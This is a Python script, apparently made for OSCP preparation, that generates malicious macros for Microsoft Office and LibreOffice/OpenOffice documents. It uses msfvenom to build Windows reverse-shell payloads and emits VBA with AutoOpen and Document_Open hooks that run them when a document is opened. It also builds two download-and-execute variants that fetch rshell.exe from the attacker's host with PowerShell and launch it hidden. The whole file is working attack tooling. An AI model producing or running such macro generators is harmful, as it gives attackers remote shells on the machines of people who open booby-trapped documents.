#!/usr/bin/env python

import sys
import subprocess
from colorama import Fore, Style

# Define the banner
BANNER = f"""{Fore.RED}
   ▄▄▄▄███▄▄▄▄      ▄████████  ▄████████    ▄████████  ▄██████▄     ▄████████ 
 ▄██▀▀▀███▀▀▀██▄   ███    ███ ███    ███   ███    ███ ███    ███   ███    ███ 
 ███   ███   ███   ███    ███ ███    █▀    ███    ███ ███    ███   ███    █▀  
 ███   ███   ███   ███    ███ ███         ▄███▄▄▄▄██▀ ███    ███   ███        
 ███   ███   ███ ▀███████████ ███        ▀▀███▀▀▀▀▀   ███    ███ ▀███████████ 
 ███   ███   ███   ███    ███ ███    █▄  ▀███████████ ███    ███          ███ 
 ███   ███   ███   ███    ███ ███    ███   ███    ███ ███    ███    ▄█    ███ 
  ▀█   ███   █▀    ███    █▀  ████████▀    ███    ███  ▀██████▀   ▄████████▀  
                                           ███    ███                         
{Style.RESET_ALL}
One script to quickly generate macros with reverse shell using 3 methods for MS Office and 1 for Libreoffice or Openoffice. Created when preparing for OSCP
"""

# Function to print colored text
def print_colored(text, color=Fore.RESET):
    print(color + text + Style.RESET_ALL)

# Print the banner
print(BANNER)

# Function to prompt the user for input
def prompt_user(prompt, default=None):
    if default:
        return input(f"{Fore.YELLOW}{prompt}{Style.RESET_ALL} [{default}]: ").strip() or default
    else:
        return input(f"{Fore.YELLOW}{prompt}{Style.RESET_ALL}: ").strip()

# Prompt the user for input
host = prompt_user("Enter the IP address of the attacker host", "192.168.1.1")
port = prompt_user("Enter the port number of the attacker listener", "443")
rshell_path = prompt_user("Enter the reverse rshell.exe location hosted on the attacker machine", "/win/rshell.exe")
rshell_exist = prompt_user("Do you have the reverse shell executable? (yes/no)", "yes").lower()

# If the user does not have the reverse shell executable, generate it
if rshell_exist == "no":
    print_colored("Generating reverse shell executable...", Fore.YELLOW)
    try:
        subprocess.run(["msfvenom", "-p", "windows/shell_reverse_tcp", f"LHOST={host}", f"LPORT={port}", "-f", "exe", "-o", "win/rshell.exe"], check=True)
        print_colored("Reverse shell executable created successfully.", Fore.GREEN)
    except subprocess.CalledProcessError:
        print_colored("Failed to generate reverse shell executable. Make sure msfvenom is installed and configured correctly.", Fore.RED)
        sys.exit(1)

# Execute msfvenom command to generate payload
try:
    msfout = subprocess.run(["msfvenom", "-p", "windows/shell_reverse_tcp", f"LHOST={host}", f"LPORT={port}", "-f", "psh-cmd"], capture_output=True, check=True)
    payload = msfout.stdout.decode().strip()
except subprocess.CalledProcessError:
    print_colored("Error generating payload with msfvenom.", Fore.RED)
    sys.exit(1)

# Generate macros
print_colored("\nGenerated Macros\n", Fore.YELLOW)
n = 50
beginstr = '''Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    Str = ""'''
print(beginstr)

macros = []

for i in range(0, len(payload), n):
    macros.append("    Str = Str + " + '"' + payload[i:i+n] + '"')

endstr = '''    CreateObject("Wscript.Shell").Run Str
End Sub
'''
print(endstr)

macros.append(endstr)

# Save macros to a file
with open("generated_macros.txt", "w") as f:
    f.write("\n".join([beginstr] + macros))

# Print the VBA-EXE method content
print_colored("\n\n--------------------------VBA-EXE-METHOD--------------------------------\n", Fore.YELLOW)
try:
    msfout = subprocess.run(["msfvenom", "-p", "windows/shell_reverse_tcp", f"LHOST={host}", f"LPORT={port}", "-f", "vba-exe"], capture_output=True, check=True)
    vba_exe_content = msfout.stdout.decode().strip()
    print_colored(vba_exe_content, Fore.CYAN)
except subprocess.CalledProcessError:
    print_colored("Error generating VBA-EXE content with msfvenom.", Fore.RED)
    sys.exit(1)

# Save VBA-EXE content to a file
with open("generated_vba_exe.txt", "w") as f:
    f.write(vba_exe_content)

# Generate macros for CRADLE method
print_colored("\n\n--------------------------CRADLE-METHOD--------------------------------\n", Fore.YELLOW)
print(beginstr)

midstr = f'    str = "powershell (New-Object System.Net.WebClient).DownloadFile(\'http://{host}{rshell_path}\', \'rshell.exe\')"'
print(midstr)

endstr = '''    Shell str, vbHide
    Dim exePath As String
    exePath = ActiveDocument.Path + "\\rshell.exe"
    Wait (4)
    Shell exePath, vbHide
End Sub

Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub
'''
print(endstr)

# Save macros to a file
with open("generated_cradle_macros.txt", "w") as f:
    f.write("\n".join([beginstr, midstr, endstr]))

print_colored("\n\n------------------LIBREOFFICE-OPENOFFICE-ODT---------------------------\n", Fore.YELLOW)

# Generate macros for LibreOffice/OpenOffice ODT
print('Sub Main')
print(f'    Shell("cmd /c powershell iwr \'http://{host}{rshell_path}\' -o \'C:/windows/tasks/rshell.exe\'")')
print('    Shell("cmd /c \'C:/windows/tasks/rshell.exe\'")')
print('End Sub')

# Save macros to a file
with open("generated_odt_macros.txt", "w") as f:
    f.write("\n".join(['Sub Main', f'    Shell("cmd /c powershell iwr \'http://{host}{rshell_path}\' -o \'C:/windows/tasks/rshell.exe\'")', '    Shell("cmd /c \'C:/windows/tasks/rshell.exe\'")', 'End Sub']))

print_colored('\n\n-----NOTES------', Fore.YELLOW)
print('For Method 3 and 4, Cradle and Libreoffice; Generate a reverse shell and host it on attacker, provide path to download it, e.g --rshell "/exp/rshell.exe"')
print('Upload TWICE when using 2 step methods, it tries to execute before download completes')
print('Try encoded powershell commands for ODT since quotes and brackets cause issues')
